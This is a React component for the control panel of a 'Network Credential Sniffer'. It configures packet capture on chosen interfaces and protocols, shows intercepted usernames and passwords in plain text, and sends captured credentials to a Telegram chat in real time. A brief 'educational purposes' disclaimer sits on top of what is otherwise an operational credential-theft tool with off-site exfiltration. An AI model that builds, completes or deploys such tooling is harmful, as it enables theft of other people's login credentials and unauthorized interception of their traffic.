import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Switch } from "@/components/ui/switch";
import { Badge } from "@/components/ui/badge";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { 
  Network, 
  Shield, 
  Play, 
  Square, 
  Eye, 
  Download,
  Zap,
  Settings,
  AlertTriangle,
  CheckCircle
} from "lucide-react";
import { useMutation, useQuery } from "@tanstack/react-query";
import { apiRequest } from "@/lib/queryClient";

interface NetworkMonitorConfig {
  interfaces: string[];
  protocols: string[];
  telegramEnabled: boolean;
  chatId?: string;
}

interface CapturedCredential {
  type: string;
  username: string;
  password: string;
  timestamp: string;
  sourceIp?: string;
  destinationIp?: string;
}

export default function NetworkSniffer() {
  const [isMonitoring, setIsMonitoring] = useState(false);
  const [monitorId, setMonitorId] = useState<string>("");
  const [config, setConfig] = useState<NetworkMonitorConfig>({
    interfaces: ['all'],
    protocols: ['HTTP', 'HTTPS', 'FTP'],
    telegramEnabled: true,
    chatId: ''
  });

  // Fetch recent captured credentials
  const { data: packets, refetch: refetchPackets } = useQuery({
    queryKey: ['/api/packets'],
    refetchInterval: 2000 // Refresh every 2 seconds
  });

  // Start network monitoring
  const startMonitoring = useMutation({
    mutationFn: async (config: NetworkMonitorConfig) => {
      const response = await fetch('/api/admin/start-network-monitor', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(config)
      });
      if (!response.ok) throw new Error('Failed to start monitoring');
      return response.json();
    },
    onSuccess: (data) => {
      setIsMonitoring(true);
      setMonitorId(data.monitorId);
    }
  });

  // Stop monitoring
  const stopMonitoring = useMutation({
    mutationFn: async () => {
      const response = await fetch('/api/admin/stop-network-monitor', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ monitorId })
      });
      if (!response.ok) throw new Error('Failed to stop monitoring');
      return response.json();
    },
    onSuccess: () => {
      setIsMonitoring(false);
      setMonitorId("");
    }
  });

  const handleStartMonitoring = () => {
    startMonitoring.mutate(config);
  };

  const handleStopMonitoring = () => {
    stopMonitoring.mutate();
  };

  const extractedCredentials = (packets || []).filter((packet: any) => {
    try {
      const payload = JSON.parse(packet.payload || '{}');
      return payload.username && payload.password;
    } catch {
      return false;
    }
  });

  return (
    <div className="space-y-6">
      <Card className="border-red-800 bg-red-950/20">
        <CardHeader>
          <CardTitle className="flex items-center gap-2 text-red-400">
            <Network className="h-5 w-5" />
            Network Credential Sniffer
            <Badge variant="destructive" className="ml-auto">
              ADMIN ONLY
            </Badge>
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-6">
          <Alert className="border-yellow-600 bg-yellow-950/20">
            <AlertTriangle className="h-4 w-4 text-yellow-400" />
            <AlertDescription className="text-yellow-400">
              This tool monitors network traffic for educational purposes. 
              Only use in authorized testing environments.
            </AlertDescription>
          </Alert>

          <Tabs defaultValue="config" className="w-full">
            <TabsList className="grid w-full grid-cols-3">
              <TabsTrigger value="config">Configuration</TabsTrigger>
              <TabsTrigger value="monitor">Live Monitor</TabsTrigger>
              <TabsTrigger value="credentials">Captured Data</TabsTrigger>
            </TabsList>

            <TabsContent value="config" className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="space-y-2">
                  <Label htmlFor="interfaces">Network Interfaces</Label>
                  <Select 
                    value={config.interfaces[0]} 
                    onValueChange={(value) => setConfig({...config, interfaces: [value]})}
                  >
                    <SelectTrigger>
                      <SelectValue placeholder="Select interface" />
                    </SelectTrigger>
                    <SelectContent>
                      <SelectItem value="all">All Interfaces</SelectItem>
                      <SelectItem value="eth0">Ethernet (eth0)</SelectItem>
                      <SelectItem value="wlan0">WiFi (wlan0)</SelectItem>
                      <SelectItem value="lo">Loopback (lo)</SelectItem>
                    </SelectContent>
                  </Select>
                </div>

                <div className="space-y-2">
                  <Label htmlFor="protocols">Protocols to Monitor</Label>
                  <div className="flex flex-wrap gap-2">
                    {['HTTP', 'HTTPS', 'FTP', 'SMTP', 'POP3'].map((protocol) => (
                      <Badge 
                        key={protocol}
                        variant={config.protocols.includes(protocol) ? "default" : "outline"}
                        className="cursor-pointer"
                        onClick={() => {
                          const newProtocols = config.protocols.includes(protocol)
                            ? config.protocols.filter(p => p !== protocol)
                            : [...config.protocols, protocol];
                          setConfig({...config, protocols: newProtocols});
                        }}
                      >
                        {protocol}
                      </Badge>
                    ))}
                  </div>
                </div>
              </div>

              <div className="space-y-4">
                <div className="flex items-center justify-between">
                  <Label htmlFor="telegram">Telegram Notifications</Label>
                  <Switch
                    id="telegram"
                    checked={config.telegramEnabled}
                    onCheckedChange={(checked) => setConfig({...config, telegramEnabled: checked})}
                  />
                </div>

                {config.telegramEnabled && (
                  <div className="space-y-2">
                    <Label htmlFor="chatId">Telegram Chat ID (Optional)</Label>
                    <Input
                      id="chatId"
                      placeholder="@your_channel or chat_id"
                      value={config.chatId}
                      onChange={(e) => setConfig({...config, chatId: e.target.value})}
                    />
                  </div>
                )}
              </div>

              <div className="flex gap-2">
                <Button
                  onClick={handleStartMonitoring}
                  disabled={isMonitoring || startMonitoring.isPending}
                  className="flex-1"
                >
                  <Play className="mr-2 h-4 w-4" />
                  {startMonitoring.isPending ? 'Starting...' : 'Start Monitoring'}
                </Button>
                
                <Button
                  onClick={handleStopMonitoring}
                  disabled={!isMonitoring || stopMonitoring.isPending}
                  variant="destructive"
                  className="flex-1"
                >
                  <Square className="mr-2 h-4 w-4" />
                  {stopMonitoring.isPending ? 'Stopping...' : 'Stop Monitoring'}
                </Button>
              </div>
            </TabsContent>

            <TabsContent value="monitor" className="space-y-4">
              <div className="flex items-center justify-between">
                <div className="flex items-center gap-2">
                  <div className={`w-3 h-3 rounded-full ${isMonitoring ? 'bg-green-500 animate-pulse' : 'bg-red-500'}`} />
                  <span className="text-sm">
                    Status: {isMonitoring ? 'Monitoring Active' : 'Monitoring Stopped'}
                  </span>
                </div>
                {monitorId && (
                  <Badge variant="outline" className="font-mono text-xs">
                    ID: {monitorId.slice(0, 8)}...
                  </Badge>
                )}
              </div>

              {isMonitoring && (
                <Alert className="border-green-600 bg-green-950/20">
                  <CheckCircle className="h-4 w-4 text-green-400" />
                  <AlertDescription className="text-green-400">
                    Network monitoring is active. Captured credentials will be sent to Telegram in real-time.
                  </AlertDescription>
                </Alert>
              )}

              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <Card className="bg-background/50">
                  <CardContent className="p-4">
                    <div className="text-2xl font-bold text-blue-400">
                      {(packets || []).length}
                    </div>
                    <div className="text-sm text-muted-foreground">
                      Total Packets
                    </div>
                  </CardContent>
                </Card>

                <Card className="bg-background/50">
                  <CardContent className="p-4">
                    <div className="text-2xl font-bold text-yellow-400">
                      {extractedCredentials.length}
                    </div>
                    <div className="text-sm text-muted-foreground">
                      Credentials Found
                    </div>
                  </CardContent>
                </Card>

                <Card className="bg-background/50">
                  <CardContent className="p-4">
                    <div className="text-2xl font-bold text-green-400">
                      {config.telegramEnabled ? 'ON' : 'OFF'}
                    </div>
                    <div className="text-sm text-muted-foreground">
                      Telegram Alerts
                    </div>
                  </CardContent>
                </Card>
              </div>
            </TabsContent>

            <TabsContent value="credentials" className="space-y-4">
              <div className="flex items-center justify-between">
                <h3 className="text-lg font-semibold text-red-400">
                  Captured Credentials
                </h3>
                <Button size="sm" onClick={() => refetchPackets()}>
                  <Eye className="mr-2 h-4 w-4" />
                  Refresh
                </Button>
              </div>

              <div className="space-y-2">
                {extractedCredentials.length === 0 ? (
                  <Alert>
                    <AlertDescription>
                      No credentials captured yet. Start monitoring to begin capturing network authentication attempts.
                    </AlertDescription>
                  </Alert>
                ) : (
                  extractedCredentials.map((packet: any, index: number) => {
                    try {
                      const cred = JSON.parse(packet.payload);
                      return (
                        <Card key={index} className="border-red-800 bg-red-950/10">
                          <CardContent className="p-4">
                            <div className="grid grid-cols-1 md:grid-cols-4 gap-4 text-sm">
                              <div>
                                <span className="text-muted-foreground">Type:</span>
                                <div className="font-mono text-yellow-400">
                                  {cred.type || packet.protocol}
                                </div>
                              </div>
                              <div>
                                <span className="text-muted-foreground">Username:</span>
                                <div className="font-mono text-green-400">
                                  {cred.username}
                                </div>
                              </div>
                              <div>
                                <span className="text-muted-foreground">Password:</span>
                                <div className="font-mono text-red-400">
                                  {cred.password}
                                </div>
                              </div>
                              <div>
                                <span className="text-muted-foreground">Time:</span>
                                <div className="font-mono text-blue-400">
                                  {new Date(cred.timestamp || packet.timestamp).toLocaleTimeString()}
                                </div>
                              </div>
                            </div>
                          </CardContent>
                        </Card>
                      );
                    } catch {
                      return null;
                    }
                  })
                )}
              </div>
            </TabsContent>
          </Tabs>
        </CardContent>
      </Card>
    </div>
  );
}